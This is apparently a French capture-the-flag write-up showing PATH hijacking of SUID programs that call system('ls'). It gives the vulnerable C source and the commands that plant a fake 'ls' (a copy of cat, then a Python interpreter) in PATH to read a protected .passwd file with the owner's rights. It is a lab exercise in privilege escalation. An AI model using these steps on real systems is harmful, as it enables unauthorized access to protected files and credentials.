# PATH




symlink + SUID :

exemple:

Code source :
1. #include <stdlib.h>
2. #include <stdio.h>
3.  
4. /* gcc -m32 -o ch11 ch11.c */
5.  
6. int main(void) 
7. {
8.         system("ls /challenge/app-script/ch11/.passwd"); 
9.         return 0;
10. }


En listant le répertoire on remarque qu’on possède l’attribute `s` sur l’exécutable `ch11`.
 Ce qui veut dire qu’on le lance avec les droits de l’owner, qui est  `app-script-ch11-cracked`, soit le même owner que le fichier `.passwd`.
app-script-ch11@challenge02:~$ ls -la
total 24
dr-xr-x---  2 app-script-ch11-cracked app-script-ch11         4096 Aug 11  2015 .
drwxr-xr-x 14 root                    root                    4096 Nov 17 21:47 ..
-r--r-----  1 app-script-ch11-cracked app-script-ch11-cracked   14 Feb  8  2012 .passwd
-r-sr-x---  1 app-script-ch11-cracked app-script-ch11         7160 Aug 11  2015 ch11
-r--r-----  1 app-script-ch11         app-script-ch11          153 Aug 11  2015 ch11.c

Afin d’exécuter `cat` à la place de `ls` il suffit de copier l’exécutable dans `/tmp`
app-script-ch11@challenge02:~$ cp /bin/cat /tmp/ls

puis de changer la valeur de la variable d’environnement `PATH`
app-script-ch11@challenge02:~$ PATH=/tmp
app-script-ch11@challenge02:~$ echo $PATH
/tmp

Donc lorsque on exécutera une nouvelle fois le fichier `ch11` il  lancera le programme `/tmp/ls` qui est une copie de `/bin/cat` et  affichera donc le mot de passe !
app-script-ch11@challenge02:~$ ./ch11
!oPe[... flag snipped ...]5




Pareil mais avec des arguments:


1. #include <stdlib.h>
2. #include <stdio.h>
3.  
4. int main(){
5.         system("ls -lA /challenge/app-script/ch12/.passwd");
6.         return 0;
7. }

mkdir -p /tmp/myself
vim /tmp/myself/ls

Le contenu du script ls ne contient que ceci : (le - final est  important, c’est lui qui permet de ne pas tenir compte des arguments)
#! /usr/bin/python -

On termine de remplacer ls par ce qu’on veut :
chmod +x /tmp/myself/ls
export PATH=/tmp/myself/:$PATH

On lance l’attaque :
./ch12

Ca nous ouvre un interpréteur python avec les droits de ch12 et là on fait ce qu’on veut... par exemple :
>>> target = "/challenge/app-script/ch12/.passwd"
>>> with open(target) as f:
...         print(f.read())
...
<flag>
>>>


